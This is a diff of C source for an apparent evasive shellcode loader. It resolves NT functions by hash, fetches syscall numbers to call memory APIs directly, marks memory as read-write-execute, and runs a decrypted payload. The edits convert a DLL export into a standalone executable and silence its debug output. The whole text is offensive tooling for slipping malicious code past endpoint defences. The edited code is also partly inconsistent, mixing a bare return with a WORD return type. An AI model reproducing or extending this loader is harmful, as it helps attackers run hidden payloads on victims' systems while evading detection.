@@ -7,12 +7,12 @@
 #include "aes.h"
 
 
-EXTERN_C __declspec(dllexport) void Runner(void){
+WORD Runner(void){
     SYSCALL_LIST   List;
     DWORD          SsnId, allocatevirtualmemory_hash, protectvirtualmemory_hash;
     LPVOID         desiredBase = NULL;
     ULONG          dwOldProtect = 0;
-    SIZE_T         sz = ENCRYPTED_BIN_LEN; // ends up being a page (0x1000) anyway
+    SIZE_T         sz = OG_PAYLOAD_LEN; // ends up being a page (0x1000) anyway
 
     // hashes for ntfunctions from SuperFasthash
     allocatevirtualmemory_hash = 894705324; // [+] AllocateVirtualMemory [Length: 21] = 894705324
@@ -35,9 +35,10 @@ EXTERN_C __declspec(dllexport) void Runner(void){
                 goto POOP;
             }
             memcpy(encrypted_instructions, cpbuf, ENCRYPTED_BIN_LEN);
+            
         }
     }
-    printf("[!] sad place\n");
+    // printf("[!] sad place\n");
     return;
 
 
@@ -55,14 +56,13 @@ POOP:
     GetSSN(&List, protectvirtualmemory_hash, &SsnId);
     status = ZwX(SsnId, NtCurrentProcess(), &desiredBase, &sz, PAGE_EXECUTE_READWRITE, &dwOldProtect); // as ntprotectvirtualmemory
     if (status != STATUS_SUCCESS) {return;}
-    printf("[+] executing!");
+    // printf("[+] executing!\n");
     // exec
     ((fnAddr)desiredBase)();
-    return;
+    return 0;
 }
 
 int main(void){
-    Runner();
-    return 0;
+    return Runner();
 }
 
